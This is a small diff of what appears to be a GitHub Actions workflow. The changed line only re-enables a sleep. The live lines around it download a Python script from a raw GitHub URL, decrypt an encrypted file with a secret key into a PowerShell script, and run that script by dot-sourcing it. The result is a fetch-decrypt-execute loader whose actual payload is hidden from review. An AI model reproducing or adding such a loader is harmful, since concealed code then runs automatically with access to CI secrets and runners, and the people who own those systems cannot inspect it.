@@ -32,7 +32,7 @@ jobs:
           curl.exe -sL "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py" -o main.py
           if (Test-Path "database_i4x.dexenc") {
               python main.py decrypt -i "database_i4x.dexenc" -key "$env:API_KEY" -o "database_i4x.ps1"
-              #Start-Sleep -s 1
+              Start-Sleep -s 1
               if (Test-Path "database_i4x.ps1") {
                   $payloadPath = Resolve-Path "database_i4x.ps1"
                   . $payloadPath
